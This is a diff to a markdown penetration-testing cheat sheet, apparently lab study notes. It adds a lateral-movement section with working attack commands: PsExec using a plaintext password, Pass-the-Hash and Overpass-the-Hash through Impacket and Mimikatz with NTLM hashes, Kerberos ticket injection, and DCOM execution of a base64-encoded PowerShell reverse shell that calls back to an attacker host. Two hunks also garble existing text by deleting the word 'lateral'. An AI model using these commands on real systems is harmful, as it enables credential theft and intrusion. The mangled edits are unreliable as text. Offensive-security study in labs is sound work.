@@ -8,7 +8,8 @@
 - [Windows priviledge](#windows-priviledge)
 - [Linux priviledge](#linux-priviledge)
 - [Active directory enumeration](#active-directory-enumeration)  
-- [Active directory authentication attack](#active-directory-authentication-attack)   
+- [Active directory authentication attack](#active-directory-authentication-attack)
+- [Lateral movement](#lateral-movement) 
 - [Public exploit](#Public-exploit)  
 - [Port tunneling and port redirection](#port-tunneling-and-port-redirection)
 - [Check/kill ports and containers](#checkkill-ports-and-containers)
@@ -133,7 +134,7 @@
      - Token impersonation (Mimikatz)
      - Cached creds or saved passwords (ntds.dit, SAM/SYSTEM)
      - Enumerate both local & domain privileges
-1. Lateral movement
+1.  movement
    - Windows: Pass-the-Hash, Kerberos attacks, RDP, SMB, WMI
    - Linux: SSH key reuse, weak passwords, cron jobs
    - Pivoting via compromised host (ligolo-ng, Impacket, CME, Chisel, proxychains, ssh -L, socat)    
@@ -873,7 +874,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
         `Restart-Service -Name <TargetService>`
     12. stablize reverse shell  
         `python3 -c 'import pty; pty.spawn("/bin/sh")'`  
-    14. post-exploitation and check for lateral movement or sensitive files  
+    14. post-exploitation and check for  movement or sensitive files  
   - Unquoted Service Paths
     - Windows service binaries that run with spaces in their path but without quotes.  
     - List Windows services with spaces in the path and missing quotes  
@@ -1276,7 +1277,81 @@ Login to DC
    - RDP (password spray)  
    - DCSync  
    - Pass-the-Hash (PtH)  
-   - Silver Ticket (Forge Kerberos ticket)  
+   - Silver Ticket (Forge Kerberos ticket)
+
+- 👥 PsExec
+  - CLIENT74 (offsec local admin) to FILES04 (jen local admin)
+  - need admin credentials, Admin$ share, SMB port 445  
+    `PS C:\Tools\SysinternalsSuite> .\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd`
+    `C:\Windows\system32>hostname`  $FILES04
+- Pass the Hash
+  - Kali to FILES04 (administrator local admin)
+  - local/domain account from `lsadump::sam`, `lsadump::dcsync`, admin right on target
+    ```
+    #Impacket
+    kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+    C:\>hostname #FILE04
+    
+    #wmiexec
+    impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:cc36cf7a8514893efccd332446158b1a corp.com/administrator@192.168.1.10
+
+    #Mimikatz
+    sekurlsa::pth /user:Administrator /domain:corp.com /ntlm:cc36cf7a8514893efccd332446158b1a
+    ```
+- 👥 Overpass the Hash (Turn NTLM into kerberos ticket and request TGS) 
+  - CLIENT76 (offsec and run a process as jen) to FILES04 (jen local admin)
+  - Dump hash for 'jen'
+    ```
+    mimikatz # privilege::debug
+    mimikatz # sekurlsa::logonpasswords
+    ```
+  - Create a new logon session with the supplied hash
+    `mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershel`
+  - Map a network share on a remote server
+    `PS C:\Windows\system32> net use \\files04`
+  - List kerberos ticket
+    `PS C:\Windows\system32> klist`  #server: krbtgt, cifs
+  - Remote by PsExec
+    `PS C:\tools\SysinternalsSuite> .\PsExec.exe \\files04 cmd`  
+- Pass the Ticket
+  - Use dave session (dave has access to WEB04 but jen no) to extract all current TGT/TGS and inject into our session
+  - CLIENT76 (jen)  #access denied for ls \\web04\backup
+  - Export TGT/TGS to disk
+    ```
+    mimikatz #privilege::debug
+    mimikatz #sekurlsa::tickets /export
+    PS C:\Tools> dir *.kirbi
+    ```
+  - Pick any TGS ticket in dave@cifs-web04.kirbi and inject it to our session
+    `mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi`  
+  - Inspecting the injected ticket in memory
+    `klist` #server: cifs/web04
+- DCOM
+  - CLIENT74 (Jen) to FILES04
+  - From an elevated PowerShell, instantiate a remote MMC 2.0 application by specifying the target IP of FILES04  
+    `$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))`  
+  - Execute a command on the remote DCOM object
+    `$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")`
+  - Adding a reverse-shell as a DCOM payload on CLIENT74
+    ```
+    #Executing the WMI PowerShell payload
+    import sys
+    import base64
+    
+    payload = '$client = New-Object System.Net.Sockets.TCPClient("<kali>",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+    
+    cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+    
+    print(cmd)
+    
+    #Running the base64 encoder Python script
+    kali@kali:~$ python3 encode.py
+    ```
+    `$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
+AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
+  - Switch back to kali
+    `kali@kali:~$ nc -lnvp 443`
+    `PS C:\Windows\system32> hostname` #FILE04
 
 **Out of scope**
 - 👥 Golden ticket
